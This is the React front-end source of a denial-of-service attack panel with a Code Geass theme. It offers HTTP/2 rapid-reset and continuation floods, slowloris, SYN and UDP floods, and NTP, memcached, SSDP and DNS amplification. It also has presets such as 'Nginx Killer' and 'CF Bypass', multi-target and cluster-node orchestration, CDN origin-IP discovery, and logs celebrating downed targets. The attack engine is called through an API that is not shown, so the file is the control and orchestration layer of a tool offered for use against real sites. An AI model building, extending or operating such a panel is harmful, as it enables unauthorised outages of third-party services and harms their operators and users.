import { useState, useEffect, useRef, useCallback, useMemo } from "react";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import {
  AreaChart, Area, XAxis, YAxis, Tooltip, ResponsiveContainer, CartesianGrid,
} from "recharts";
import {
  useListMethods,
  useCreateAttack,
  useGetAttackStats,
  useGetAttack,
  useStopAttack,
  useListAttacks,
  getGetAttackStatsQueryKey,
  getGetAttackQueryKey,
  getListAttacksQueryKey,
} from "@workspace/api-client-react";

const GEASS_SYMBOL = `${import.meta.env.BASE_URL}geass-symbol.png`;
const LELOUCH_GIF  = `${import.meta.env.BASE_URL}lelouch.gif`;

const queryClient = new QueryClient({ defaultOptions: { queries: { retry: 1 } } });
const BASE = import.meta.env.BASE_URL.replace(/\/$/, "");

/* ── Types ── */
type LogType = "info" | "success" | "error" | "warn";
type AppTheme = "lelouch" | "suzaku";
interface LogEntry       { id: number; text: string; type: LogType; ts: number; }
interface CheckResult    { up: boolean; status: number; statusText: string; responseTime: number; error: string | null; }
interface Preset         { label: string; method: string; packetSize: number; duration: number; delay: number; threads: number; icon: string; }
interface UserPreset     { id: string; label: string; method: string; packetSize: number; duration: number; delay: number; threads: number; }
interface MethodRec      { method: string; name: string; score: number; reason: string; suggestedThreads: number; suggestedDuration: number; protocol: string; amplification: number; tier: string; }
interface AnalyzeResult  {
  target: string; ip: string | null; allIPs: string[]; isIP: boolean; hasDNS: boolean;
  httpAvailable: boolean; httpsAvailable: boolean; responseTimeMs: number;
  serverHeader: string; serverType: string; serverLabel: string;
  isCDN: boolean; cdnProvider: string;
  hasWAF: boolean; wafProvider: string;
  supportsH2: boolean; supportsH3: boolean; altSvc: string;
  hasHSTS: boolean; hstsMaxAge: number;
  hasGraphQL: boolean; hasWebSocket: boolean;
  openPorts: number[];
  originIP: string | null; originSubdomain: string | null;
  recommendations: MethodRec[];
}
interface NamedTarget    { url: string; label: string; }
interface Toast          { id: string; type: "success"|"warn"|"error"|"geass"|"launch"|"stop"; title: string; msg?: string; }
interface DomainScore    { total: number; downed: number; lastMethod: string; lastSeen: number; }

/* ── Method classification ── */
const L7_HTTP_FE  = new Set(["http-flood","http-bypass","http2-flood","slowloris","rudy"]);
const L4_TCP_FE   = new Set(["syn-flood","tcp-flood","tcp-ack","tcp-rst","conn-flood"]);
const L4_UDP_FE   = new Set(["udp-flood","udp-bypass"]);
const L7_PROXY_OK = new Set([
  "http-flood","http-bypass","waf-bypass",
  "graphql-dos","cache-poison","rudy-v2",
  "http2-flood","http2-continuation","hpack-bomb","ssl-death","tls-renego",
  "conn-flood","ws-flood","h2-settings-storm",
]);
const methodInfo = (m: string) => {
  if (m === "geass-override")      return { badge: "ARES ∞ [33V]",  cls: "geass",     color: "#C0392B" };
  if (m === "waf-bypass")          return { badge: "WAF BYPASS",    cls: "geass",     color: "#8E44AD" };
  if (m === "http2-flood")         return { badge: "CVE-2023",      cls: "real-http", color: "#1abc9c" };
  if (m === "http2-continuation")  return { badge: "CVE-2024",      cls: "real-http", color: "#e74c3c" };
  if (m === "h2-settings-storm")   return { badge: "H2 STORM",      cls: "real-http", color: "#00bcd4" };
  if (m === "hpack-bomb")          return { badge: "HPACK BOMB",    cls: "real-http", color: "#e91e8c" };
  if (m === "slowloris")           return { badge: "SLOWLORIS",     cls: "real-http", color: "#9b59b6" };
  if (m === "rudy-v2")             return { badge: "RUDY v2",       cls: "real-http", color: "#c0392b" };
  if (m === "ws-flood")            return { badge: "WS EXHAUST",    cls: "real-http", color: "#f39c12" };
  if (m === "graphql-dos")         return { badge: "GRAPHQL",       cls: "real-http", color: "#8e44ad" };
  if (m === "cache-poison")        return { badge: "CDN POISON",    cls: "real-http", color: "#16a085" };
  if (m === "tls-renego")          return { badge: "TLS RENEGO",    cls: "real-tcp",  color: "#d35400" };
  if (m === "ssl-death")           return { badge: "SSL DEATH",     cls: "real-tcp",  color: "#7f8c8d" };
  if (m === "quic-flood")          return { badge: "QUIC/H3",       cls: "real-udp",  color: "#2980b9" };
  if (m === "conn-flood")          return { badge: "CONN FLOOD",    cls: "real-tcp",  color: "#e74c3c" };
  if (m === "icmp-flood")          return { badge: "ICMP FLOOD",    cls: "real-udp",  color: "#ff6b35" };
  if (m === "ntp-amp")             return { badge: "NTP FLOOD",     cls: "real-udp",  color: "#00d4aa" };
  if (m === "mem-amp")             return { badge: "MEMCACHED",     cls: "real-udp",  color: "#a855f7" };
  if (m === "ssdp-amp")            return { badge: "SSDP/UPnP",    cls: "real-udp",  color: "#06b6d4" };
  if (m === "http-pipeline")       return { badge: "PIPELINE",      cls: "real-http", color: "#f97316" };
  if (L7_HTTP_FE.has(m))          return { badge: "REAL HTTP",     cls: "real-http", color: "#2ecc71" };
  if (L4_TCP_FE.has(m))           return { badge: "REAL TCP",      cls: "real-tcp",  color: "#3498db" };
  if (L4_UDP_FE.has(m))           return { badge: "REAL UDP",      cls: "real-udp",  color: "#e67e22" };
  return { badge: "REAL ATTACK", cls: "real-tcp", color: "#64748b" };
};

/* ── Smart cluster LB — method assignment per node index ── */
const CLUSTER_LB_METHODS = ["http-flood","tcp-flood","udp-flood","http-bypass","http2-flood"];
function getSmartMethod(baseMethod: string, nodeIdx: number): string {
  if (nodeIdx === 0) return baseMethod;
  if (baseMethod === "geass-override") return baseMethod;
  return CLUSTER_LB_METHODS[nodeIdx % CLUSTER_LB_METHODS.length];
}

/* ── Built-in presets ── */
const PRESETS: Preset[] = [
  { label: "Geass Override", method: "geass-override",      packetSize: 512, duration: 300, delay: 0, threads: 3000, icon: "👁"  },
  { label: "Nginx Killer",   method: "http2-continuation",  packetSize: 64,  duration: 180, delay: 0, threads: 1000, icon: "💀"  },
  { label: "CF Bypass",      method: "waf-bypass",          packetSize: 512, duration: 300, delay: 0, threads: 1000, icon: "🌐"  },
  { label: "DNS Torture",    method: "dns-amp",             packetSize: 64,  duration: 180, delay: 0, threads: 128,  icon: "📛"  },
  { label: "H2 RST Burst",   method: "http2-flood",         packetSize: 512, duration: 120, delay: 0, threads: 500,  icon: "⚡"  },
  { label: "Pipeline Flood", method: "http-pipeline",       packetSize: 512, duration: 120, delay: 0, threads: 1000, icon: "🚇"  },
  { label: "H2 Storm",       method: "h2-settings-storm",   packetSize: 64,  duration: 180, delay: 0, threads: 1000, icon: "🌊"  },
  { label: "HPACK Bomb",     method: "hpack-bomb",          packetSize: 512, duration: 180, delay: 0, threads: 500,  icon: "🧨"  },
  { label: "Conn Flood",     method: "conn-flood",          packetSize: 64,  duration: 300, delay: 0, threads: 500,  icon: "🔌"  },
  { label: "Slowloris",      method: "slowloris",           packetSize: 32,  duration: 300, delay: 0, threads: 500,  icon: "🥷"  },
  { label: "UDP Hammer",     method: "udp-flood",           packetSize: 1024,duration: 180, delay: 0, threads: 128,  icon: "💥"  },
  { label: "NTP Nuclear",    method: "ntp-amp",             packetSize: 46,  duration: 120, delay: 0, threads: 128,  icon: "☢️"  },
  { label: "HTTP Flood",     method: "http-flood",          packetSize: 64,  duration: 120, delay: 0, threads: 1000, icon: "🌊"  },
];

/* ── Log counter ── */
let _lid = 0;
const mkLog = (text: string, type: LogType = "info"): LogEntry => ({ id: ++_lid, text, type, ts: Date.now() });

/* ── Domain key helper ── */
function getDomainKey(url: string): string {
  try { return new URL(url.startsWith("http") ? url : `http://${url}`).hostname; } catch { return url; }
}

/* ── Terminal log highlighter ── */
const HIGHLIGHT_METHODS = ["http-flood","http-bypass","http2-flood","http2-continuation","slowloris","conn-flood","udp-flood","udp-bypass","syn-flood","tcp-flood","tcp-ack","tcp-rst","geass-override","dns-amp","ntp-amp","mem-amp","ssdp-amp","rudy","rudy-v2","waf-bypass","hpack-bomb","h2-settings-storm","graphql-dos","ws-flood","cache-poison","tls-renego","ssl-death","quic-flood","icmp-flood","http-pipeline"];
function highlightLog(text: string): React.ReactNode {
  // Segment the text into colored spans
  const parts: React.ReactNode[] = [];
  let cursor = 0;

  // Build a list of match regions: [start, end, component]
  type Region = { start: number; end: number; node: React.ReactNode };
  const regions: Region[] = [];

  // 1. URLs — gold
  const urlRe = /https?:\/\/[^\s,;\"']+/g;
  let m: RegExpExecArray | null;
  while ((m = urlRe.exec(text)) !== null)
    regions.push({ start: m.index, end: m.index + m[0].length, node: <span key={m.index} className="hl-url">{m[0]}</span> });

  // 2. IPs — cyan
  const ipRe = /\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}(?::\d+)?\b/g;
  while ((m = ipRe.exec(text)) !== null) {
    if (!regions.some(r => m!.index >= r.start && m!.index < r.end))
      regions.push({ start: m.index, end: m.index + m[0].length, node: <span key={m.index+10000} className="hl-ip">{m[0]}</span> });
  }

  // 3. Method names — method color
  for (const method of HIGHLIGHT_METHODS) {
    const mre = new RegExp(`\\b${method}\\b`, "gi");
    while ((m = mre.exec(text)) !== null) {
      if (!regions.some(r => m!.index >= r.start && m!.index < r.end)) {
        const mi = methodInfo(method);
        regions.push({ start: m.index, end: m.index + m[0].length, node: <span key={m.index+20000} style={{ color: mi.color, fontWeight: 700 }}>{m[0]}</span> });
      }
    }
  }

  // 4. Numbers with units — bright white
  const numRe = /\b[\d,]+(?:\.\d+)?\s*(?:pps|req\/s|pkts|Mbps|Gbps|Kbps|MB|GB|KB|ms)\b/g;
  while ((m = numRe.exec(text)) !== null) {
    if (!regions.some(r => m!.index >= r.start && m!.index < r.end))
      regions.push({ start: m.index, end: m.index + m[0].length, node: <span key={m.index+30000} className="hl-num">{m[0]}</span> });
  }

  // 5. ID #N — dim gold
  const idRe = /\bID #\d+\b/g;
  while ((m = idRe.exec(text)) !== null) {
    if (!regions.some(r => m!.index >= r.start && m!.index < r.end))
      regions.push({ start: m.index, end: m.index + m[0].length, node: <span key={m.index+40000} className="hl-id">{m[0]}</span> });
  }

  // Sort by start position
  regions.sort((a, b) => a.start - b.start);

  for (const region of regions) {
    if (region.start > cursor) parts.push(text.slice(cursor, region.start));
    parts.push(region.node);
    cursor = region.end;
  }
  if (cursor < text.length) parts.push(text.slice(cursor));
  return <>{parts}</>;
}

/* ── Audio — singleton AudioContext, resumed on each play ── */
let _audioCtx: AudioContext | null = null;
function getAudioCtx(): AudioContext {
  if (!_audioCtx || _audioCtx.state === "closed") {
    _audioCtx = new AudioContext();
  }
  return _audioCtx;
}

function playTone(type: "start" | "stop" | "tick" | "check" | "kill") {
  try {
    const ctx = getAudioCtx();
    // Browser autoplay policy: context may be suspended if created before
    // a user gesture. resume() is a no-op if already running.
    ctx.resume().then(() => {
      const o = ctx.createOscillator();
      const g = ctx.createGain();
      o.connect(g); g.connect(ctx.destination);
      const t = ctx.currentTime;
      if (type === "start") {
        o.type = "sawtooth";
        o.frequency.setValueAtTime(110, t); o.frequency.exponentialRampToValueAtTime(880, t + 0.3);
        g.gain.setValueAtTime(0.12, t); g.gain.exponentialRampToValueAtTime(0.001, t + 0.5);
        o.start(); o.stop(t + 0.55);
      } else if (type === "stop") {
        o.type = "sine";
        o.frequency.setValueAtTime(440, t); o.frequency.exponentialRampToValueAtTime(110, t + 0.4);
        g.gain.setValueAtTime(0.09, t); g.gain.exponentialRampToValueAtTime(0.001, t + 0.5);
        o.start(); o.stop(t + 0.55);
      } else if (type === "kill") {
        o.type = "square";
        o.frequency.setValueAtTime(60, t); o.frequency.exponentialRampToValueAtTime(20, t + 0.8);
        g.gain.setValueAtTime(0.2, t); g.gain.exponentialRampToValueAtTime(0.001, t + 0.9);
        o.start(); o.stop(t + 1.0);
      } else if (type === "tick") {
        o.type = "sine";
        o.frequency.setValueAtTime(600, t);
        g.gain.setValueAtTime(0.03, t); g.gain.exponentialRampToValueAtTime(0.001, t + 0.04);
        o.start(); o.stop(t + 0.05);
      } else {
        o.type = "triangle";
        o.frequency.setValueAtTime(528, t); o.frequency.exponentialRampToValueAtTime(1056, t + 0.18);
        g.gain.setValueAtTime(0.07, t); g.gain.exponentialRampToValueAtTime(0.001, t + 0.25);
        o.start(); o.stop(t + 0.3);
      }
    }).catch(() => { /* user hasn't interacted yet — ignore */ });
  } catch { /* Web Audio not supported */ }
}

/* ── Formatters ── */
const fmtNum  = (n: number) => n.toLocaleString();
const fmtBps  = (n: number) => {
  const bps = n * 8;
  if (bps >= 1e12) return (bps / 1e12).toFixed(2) + " Tbps";
  if (bps >= 1e9)  return (bps / 1e9).toFixed(2)  + " Gbps";
  if (bps >= 1e6)  return (bps / 1e6).toFixed(1)  + " Mbps";
  if (bps >= 1e3)  return (bps / 1e3).toFixed(1)  + " Kbps";
  return bps + " bps";
};
const fmtBytes = (n: number) => {
  if (n >= 1e12) return (n / 1e12).toFixed(2) + " TB";
  if (n >= 1e9)  return (n / 1e9).toFixed(2) + " GB";
  if (n >= 1e6)  return (n / 1e6).toFixed(1) + " MB";
  if (n >= 1e3)  return (n / 1e3).toFixed(1) + " KB";
  return n + " B";
};
const statusColor = (code: number) => {
  if (code === 0) return "#777";
  if (code < 300) return "#2ecc71";
  if (code < 400) return "#f39c12";
  if (code < 500) return "#C0392B";
  return "#8e44ad";
};
const powerLevel = (threads: number, m?: string) => {
  if (m === "geass-override") return { label: "ABSOLUTE GEASS", color: "#ff0033", pct: 100 };
  if (threads >= 512) return { label: "GODMODE",    color: "#ff00ff", pct: 100 };
  if (threads >= 256) return { label: "OBLITERATE", color: "#ff0033", pct: 98  };
  if (threads >= 128) return { label: "MAXIMUM",    color: "#ff4400", pct: 92  };
  if (threads >= 64)  return { label: "CRITICAL",   color: "#C0392B", pct: 80  };
  if (threads >= 32)  return { label: "HIGH",       color: "#e67e22", pct: 62  };
  if (threads >= 16)  return { label: "MODERATE",   color: "#D4AF37", pct: 42  };
  if (threads >= 8)   return { label: "LOW",        color: "#8A7B65", pct: 22  };
  return               { label: "MINIMAL",   color: "#5A4E40", pct: 8  };
};

/* ── Log message pools ── */
const LOG_MSGS_HTTP = [
  (t: string, n: string) => `👁 ${n} real HTTP requests fired → ${t}`,
  (t: string) => `👁 Flood workers maintaining ${t} under load [LIVE]`,
  (_t: string, n: string) => `👁 ${n} req/s reaching target — HTTP workers active`,
  (t: string) => `👁 Connection pressure on ${t} — hold the line`,
  (_t: string, n: string) => `👁 ${n} HTTP/1.1 requests dispatched this second`,
];
const LOG_MSGS_TCP = [
  (t: string, n: string) => `👁 ${n} TCP SYN packets sent → ${t}:80 [REAL]`,
  (t: string) => `👁 Socket pool flooding ${t} — connection queue growing`,
  (_t: string, n: string) => `👁 ${n} TCP connections/sec — RST storm active`,
  (t: string) => `👁 ${t} connection table under siege`,
];
const LOG_MSGS_UDP = [
  (t: string, n: string) => `👁 ${n} real UDP datagrams sent → ${t} [LIVE]`,
  (_t: string, n: string) => `👁 ${n} pkt/s — UDP flood socket pool saturating target`,
  (t: string) => `👁 Raw UDP layer hammering ${t} — bandwidth pipe filling`,
  (_t: string, n: string) => `👁 ${n} UDP packets dispatched — dgram sockets at max throughput`,
];
const LOG_MSGS_H2 = [
  (t: string, n: string) => `👁 ${n} HTTP/2 streams multiplexed → ${t} [H2 NATIVE]`,
  (_t: string, n: string) => `👁 ${n} req/s — H2 sessions saturating server stream limits`,
  (t: string) => `👁 HTTP/2 multiplexed flood hammering ${t} — HPACK compressed`,
  (_t: string, n: string) => `👁 ${n} H2 streams/sec — bypass per-connection limits`,
];
const LOG_MSGS_SLOW = [
  (t: string, n: string) => `👁 ${n} half-open connections held → ${t} [SLOWLORIS]`,
  (_t: string, n: string) => `👁 ${n} server threads occupied — connection pool draining`,
  (t: string) => `👁 ${t} connection table: slots filling — server starving`,
  (_t: string, n: string) => `👁 ${n} TCP sockets open, trickling headers — server frozen`,
];
const LOG_MSGS_AMP = [
  (t: string, n: string) => `👁 ${n} amplified packets fired → ${t} [REAL UDP AMP]`,
  (_t: string, n: string) => `👁 ${n} pkt/s — amplification factor active, bandwidth multiplied`,
  (t: string) => `👁 Amplification layer hammering ${t} — reflection flood engaged`,
  (_t: string, n: string) => `👁 ${n} packets dispatched — DNS/NTP/Memcached/SSDP reflecting`,
];
const LOG_MSGS_TLS = [
  (t: string, n: string) => `👁 ${n} TLS sessions held → ${t} [CONN EXHAUST]`,
  (_t: string, n: string) => `👁 ${n} encrypted channels open — TLS stack saturating`,
  (t: string) => `👁 ${t} TLS worker pool draining — renegotiation storm active`,
  (_t: string, n: string) => `👁 ${n} SSL/TLS handshakes/sec — cipher CPU consumed`,
];
const LOG_MSGS_CONN = [
  (t: string, n: string) => `👁 ${n} TLS connections held open → ${t} [CONN FLOOD]`,
  (_t: string, n: string) => `👁 ${n} simultaneous sockets open — bypassing HTTP rate limiting`,
  (t: string) => `👁 ${t} connection table filling — TLS handshakes overwhelming server`,
  (_t: string, n: string) => `👁 ${n} conn/s — 16K socket storm, server fd pool saturating`,
  (t: string) => `👁 Direct TLS pressure on ${t} — bypassing all application-layer defenses`,
];
const LOG_MSGS_GEASS = [
  (t: string, n: string) => `👁 Geass Override ARES OMNIVECT ∞: ${n} strikes obliterating ${t} on 33 vectors`,
  (t: string) => `👁 ARES assault active — ConnFlood+Slowloris+H2RST+H2CONT+HPACK+WAF+WS+GQL+RUDY2+Cache+TLS+QUIC+SSL+Pipeline+Storm+ICMP+DNS+NTP+Memc+SSDP on ${t}`,
  (_t: string, n: string) => `👁 ${n} simultaneous vectors — 33-way siege, target has no defensive surface`,
  (t: string) => `👁 ${t} overwhelmed — 33 concurrent attack vectors, absolute protocol annihilation`,
  (_t: string, n: string) => `👁 ${n} req/s ARES-vector — L3+L4+L7 fully saturated, WAF bypassed, CDN poisoned`,
  (t: string) => `👁 The king's Geass has been cast upon ${t} — OMNIVECT ABSOLUTE SUBJUGATION`,
  (_t: string, n: string) => `👁 ${n} strikes/sec — H2RST+HPACK+CONT+AppSmartFlood+LargeHeaderBomb+H2Priority flooding into eviction loop`,
  (t: string) => `👁 33-vector storm on ${t}: ICMP+DNS-Torture+NTP+Memc+SSDP+RUDY v2+TLS renego+QUIC+Pipeline+H2Storm+AppSmart+LargeHeader+H2Priority flood`,
  (_t: string, n: string) => `👁 ${n} operations/sec — GraphQL fragment bombs + cache eviction + SSL death records + Pipeline 300K req/s`,
  (t: string) => `👁 ABSOLUTE GEASS — 33 real attack vectors firing simultaneously on ${t}, zero mercy`,
];

/* ── Sparkline chart ── */
function Sparkline({ data, color = "#D4AF37" }: { data: number[]; color?: string }) {
  if (data.length < 2) return null;
  const W = 200, H = 38;
  const max = Math.max(...data, 1);
  const pts = data.map((v, i) => {
    const x = (i / (data.length - 1)) * W;
    const y = H - (v / max) * (H - 4) - 2;
    return `${x.toFixed(1)},${y.toFixed(1)}`;
  }).join(" ");
  return (
    <svg viewBox={`0 0 ${W} ${H}`} className="lb-sparkline" preserveAspectRatio="none">
      <defs>
        <linearGradient id={`spk-g-${color.replace("#","")}`} x1="0" y1="0" x2="0" y2="1">
          <stop offset="0%" stopColor={color} stopOpacity="0.28"/>
          <stop offset="100%" stopColor={color} stopOpacity="0.02"/>
        </linearGradient>
      </defs>
      <polygon points={`0,${H} ${pts} ${W},${H}`} fill={`url(#spk-g-${color.replace("#","")})`}/>
      <polyline points={pts} fill="none" stroke={color} strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
    </svg>
  );
}

/* ── Live RPS chart — Recharts AreaChart with axes, tooltip, peak marker ── */
const fmtChartNum = (v: number): string => {
  if (v >= 1_000_000) return (v / 1_000_000).toFixed(1) + "M";
  if (v >= 1_000)     return (v / 1_000).toFixed(1) + "K";
  return String(Math.round(v));
};

function LiveRpsChart({
  ppsData, bpsData, color = "#D4AF37", peakPps,
}: {
  ppsData: number[]; bpsData: number[]; color?: string; peakPps: number;
}) {
  const chartData = useMemo(() => {
    const len = Math.max(ppsData.length, bpsData.length);
    return Array.from({ length: len }, (_, i) => ({
      t:    i - len + 1,                 // negative = seconds ago
      pps:  ppsData[i]  ?? 0,
      mbps: ((bpsData[i] ?? 0) * 8) / 1_048_576, // bytes/s → Mbps
    }));
  }, [ppsData, bpsData]);

  if (chartData.length < 2) return null;

  return (
    <div style={{ width: "100%", height: 140, marginTop: "0.4rem" }}>
      <ResponsiveContainer width="100%" height="100%">
        <AreaChart data={chartData} margin={{ top: 6, right: 6, left: -10, bottom: 0 }}>
          <defs>
            <linearGradient id="rps-grad" x1="0" y1="0" x2="0" y2="1">
              <stop offset="0%"   stopColor={color} stopOpacity={0.55}/>
              <stop offset="100%" stopColor={color} stopOpacity={0.02}/>
            </linearGradient>
            <linearGradient id="bps-grad" x1="0" y1="0" x2="0" y2="1">
              <stop offset="0%"   stopColor="#9b59b6" stopOpacity={0.30}/>
              <stop offset="100%" stopColor="#9b59b6" stopOpacity={0.01}/>
            </linearGradient>
          </defs>
          <CartesianGrid stroke="rgba(255,255,255,0.05)" vertical={false}/>
          <XAxis
            dataKey="t"
            tick={{ fill: "rgba(255,255,255,0.42)", fontSize: 9 }}
            axisLine={{ stroke: "rgba(255,255,255,0.1)" }}
            tickLine={false}
            tickFormatter={(v) => v === 0 ? "now" : `${v}s`}
            interval="preserveStartEnd"
          />
          <YAxis
            yAxisId="pps"
            tick={{ fill: "rgba(212,175,55,0.55)", fontSize: 9 }}
            axisLine={false} tickLine={false}
            tickFormatter={fmtChartNum}
            width={42}
          />
          <YAxis
            yAxisId="mbps" orientation="right"
            tick={{ fill: "rgba(155,89,182,0.55)", fontSize: 9 }}
            axisLine={false} tickLine={false}
            tickFormatter={(v) => v.toFixed(0)}
            width={28}
          />
          <Tooltip
            contentStyle={{
              background: "rgba(8,8,12,0.95)",
              border: "1px solid rgba(212,175,55,0.35)",
              borderRadius: 4, fontSize: 11, padding: "6px 10px",
            }}
            labelStyle={{ color: "rgba(255,255,255,0.5)", fontSize: 10 }}
            itemStyle={{ padding: 0 }}
            labelFormatter={(v) => v === 0 ? "now" : `${v}s ago`}
            formatter={(v: number, n: string) => {
              if (n === "pps")  return [fmtChartNum(v) + " pps", "RPS"];
              if (n === "mbps") return [v.toFixed(2) + " Mbps", "Bandwidth"];
              return [v, n];
            }}
          />
          <Area
            yAxisId="pps" type="monotone" dataKey="pps"
            stroke={color} strokeWidth={1.6} fill="url(#rps-grad)"
            isAnimationActive={false}
          />
          <Area
            yAxisId="mbps" type="monotone" dataKey="mbps"
            stroke="#9b59b6" strokeWidth={1.2} fill="url(#bps-grad)"
            isAnimationActive={false}
          />
        </AreaChart>
      </ResponsiveContainer>
      {peakPps > 0 && (
        <div style={{
          display: "flex", justifyContent: "space-between",
          fontSize: 10, color: "rgba(255,255,255,0.45)",
          marginTop: 2, padding: "0 4px",
        }}>
          <span>Peak <strong style={{ color }}>{fmtChartNum(peakPps)} pps</strong></span>
          <span style={{ color: "rgba(155,89,182,0.7)" }}>● Bandwidth (Mbps)</span>
        </div>
      )}
    </div>
  );
}

/* ── Pulsing Geass Eye SVG (intensity 0–1 drives animation speed & glow) ── */
function GeassEye({ intensity = 0 }: { intensity?: number }) {
  const speed  = Math.max(2, 20 - intensity * 18); // 20s idle → 2s at max power
  const glow   = 0.06 + intensity * 0.5;
  const scale  = 1 + intensity * 0.25;
  return (
    <div className="geass-eye-bg" aria-hidden="true"
      style={{ "--eye-speed": `${speed}s`, "--eye-glow": glow, "--eye-scale": scale } as React.CSSProperties}>
      <svg viewBox="0 0 400 400" xmlns="http://www.w3.org/2000/svg">
        <ellipse cx="200" cy="200" rx="180" ry="90" stroke={`rgba(212,175,55,${0.08 + intensity * 0.14})`} strokeWidth="1.5" fill="none"/>
        <ellipse cx="200" cy="200" rx="140" ry="70" stroke={`rgba(212,175,55,${0.05 + intensity * 0.1})`} strokeWidth="1" fill="none"/>
        <circle cx="200" cy="200" r="55" stroke={`rgba(192,57,43,${0.15 + intensity * 0.35})`} strokeWidth="1.5" fill="none"/>
        <circle cx="200" cy="200" r="30" stroke={`rgba(192,57,43,${0.1 + intensity * 0.25})`} strokeWidth="1" fill="none"/>
        <circle cx="200" cy="200" r="10" fill={`rgba(192,57,43,${0.1 + intensity * 0.5})`}/>
        {Array.from({ length: 12 }, (_, i) => {
          const deg = i * 30;
          const r   = (deg * Math.PI) / 180;
          return <line key={i}
            x1={200 + Math.cos(r) * 65}  y1={200 + Math.sin(r) * 65}
            x2={200 + Math.cos(r) * 185} y2={200 + Math.sin(r) * 185}
            stroke={`rgba(212,175,55,${0.04 + intensity * 0.1})`} strokeWidth="1"/>;
        })}
        <path d="M200,145 L212,170 L240,170 L218,188 L226,215 L200,198 L174,215 L182,188 L160,170 L188,170 Z"
          stroke={`rgba(192,57,43,${0.08 + intensity * 0.25})`} strokeWidth="1" fill="none"/>
      </svg>
    </div>
  );
}

/* ── Geass Override particle burst overlay ── */
function GeassParticles() {
  return (
    <div className="lb-geass-particles" aria-hidden="true">
      {Array.from({ length: 10 }, (_, i) => (
        <div key={i} className="lb-particle" style={{
          left: `${8 + i * 9}%`,
          bottom: `${4 + (i % 4) * 7}%`,
          animationDelay: `${i * 0.35}s`,
          animationDuration: `${2.4 + (i % 3) * 0.5}s`,
          width:  `${1 + (i % 3)}px`,
          height: `${1 + (i % 3)}px`,
          background: i % 2 === 0 ? "rgba(192,57,43,0.85)" : "rgba(212,175,55,0.7)",
          boxShadow: i % 2 === 0 ? "0 0 4px rgba(192,57,43,0.8)" : "0 0 4px rgba(212,175,55,0.7)",
        }} />
      ))}
    </div>
  );
}

/* ── Panel ── */
function Panel() {
  /* Config state */
  const [target, setTarget]       = useState("");
  const [method, setMethod]       = useState("http-flood");
  const [packetSize, setPacketSize] = useState(64);
  const [duration, setDuration]   = useState(60);
  const [delay, setDelay]         = useState(100);
  const [threads, setThreads]     = useState(16);
  const [webhookUrl, setWebhookUrl] = useState("");
  const [showWebhook, setShowWebhook] = useState(false);

  /* Multi-target */
  const [extraTargets, setExtraTargets] = useState<[string, string]>(["", ""]);
  const [showMultiTarget, setShowMultiTarget] = useState(false);
  const [extraAttackIds, setExtraAttackIds] = useState<(number | null)[]>([]);

  /* Attack state */
  const [currentAttackId, setCurrentAttackId] = useState<number | null>(null);
  const [isRunning, setIsRunning] = useState(false);
  const [progress, setProgress]  = useState(0);

  /* Live metrics */
  const [pps, setPps]            = useState(0);
  const [bps, setBps]            = useState(0);
  const [peakPps, setPeakPps]    = useState(0);
  const [peakBps, setPeakBps]    = useState(0);
  const [ppsHistory, setPpsHistory] = useState<number[]>([]);
  const [bpsHistory, setBpsHistory] = useState<number[]>([]);
  const [latencyHistory, setLatencyHistory] = useState<number[]>([]);
  const [lastAtkPkts,  setLastAtkPkts]  = useState(0);
  const [lastAtkBytes, setLastAtkBytes] = useState(0);
  const peakPpsRef = useRef(0);
  const peakBpsRef = useRef(0);
  const lastPacketsRef = useRef(0);
  const lastBytesRef   = useRef(0);
  const currentPacketsRef = useRef(0);
  const currentBytesRef   = useRef(0);
  // Client-side PPS calculation refs — avoids server-side timer drift
  const prevLivePktsRef   = useRef<number | null>(null);
  const prevLiveBytesRef  = useRef<number | null>(null);
  const prevLivePollMs    = useRef<number | null>(null);
  const emaPpsRef         = useRef(0);
  const emaBpsRef         = useRef(0);

  /* Target monitoring */
  const [targetStatus, setTargetStatus] = useState<"unknown" | "online" | "offline">("unknown");
  const targetStatusRef   = useRef<"unknown" | "online" | "offline">("unknown");
  const consecutiveFailsRef = useRef(0);
  const CONSECUTIVE_FAILS_TO_CONFIRM = 3;

  /* UI state */
  const [logs, setLogs]             = useState<LogEntry[]>([mkLog("Awaiting Geass command...", "info")]);
  const [soundEnabled, setSoundEnabled] = useState(true);
  const soundRef = useRef(true);

  /* Favorites (plain URLs) */
  const [favorites, setFavorites] = useState<string[]>(() => {
    try { return JSON.parse(localStorage.getItem("lb-favorites") || "[]"); } catch { return []; }
  });

  /* Named targets */
  const [namedTargets, setNamedTargets] = useState<NamedTarget[]>(() => {
    try { return JSON.parse(localStorage.getItem("lb-named-targets") || "[]"); } catch { return []; }
  });
  const [showNamedTargets, setShowNamedTargets] = useState(false);
  const [newNameLabel, setNewNameLabel] = useState("");

  /* Custom user presets */
  const [userPresets, setUserPresets] = useState<UserPreset[]>(() => {
    try { return JSON.parse(localStorage.getItem("lb-user-presets") || "[]"); } catch { return []; }
  });
  const [showCustomPresets, setShowCustomPresets] = useState(false);
  const [newPresetLabel, setNewPresetLabel] = useState("");

  /* Smart cluster LB */
  const [smartLB, setSmartLB] = useState(() => localStorage.getItem("lb-smart-lb") !== "0");

  const [showFavs, setShowFavs]     = useState(false);
  const [showHistory, setShowHistory] = useState(false);
  const [entered, setEntered]       = useState(false);

  /* Cluster mode */
  const [clusterNodes, setClusterNodes] = useState<string[]>(() => {
    try {
      const saved = JSON.parse(localStorage.getItem("lb-cluster-nodes") || "[]") as string[];
      if (saved.length > 0) return saved;
      const envNodes = ((import.meta.env.VITE_CLUSTER_NODES as string) ?? "")
        .split(",").map(s => s.trim()).filter(Boolean);
      if (envNodes.length > 0) localStorage.setItem("lb-cluster-nodes", JSON.stringify(envNodes));
      return envNodes;
    } catch { return []; }
  });
  const [clusterInput,      setClusterInput]      = useState("");
  const [showCluster,       setShowCluster]        = useState(false);
  const [clusterAttackIds,  setClusterAttackIds]   = useState<{node: string; id: number; assignedMethod: string}[]>([]);
  const [clusterTotalPkts,  setClusterTotalPkts]   = useState(0);
  const [clusterTotalBytes, setClusterTotalBytes]  = useState(0);

  /* Node health monitoring */
  interface NodeHealth { url: string; online: boolean; latencyMs: number; cpus?: number; freeMem?: number; }
  const [nodeHealth, setNodeHealth] = useState<NodeHealth[]>([]);

  /* Site checker */
  const [checkerUrl, setCheckerUrl] = useState("");
  const [checkerResult, setCheckerResult] = useState<CheckResult | null>(null);
  const [isChecking, setIsChecking] = useState(false);

  /* Analyzer */
  const [analyzeResult, setAnalyzeResult] = useState<AnalyzeResult | null>(null);
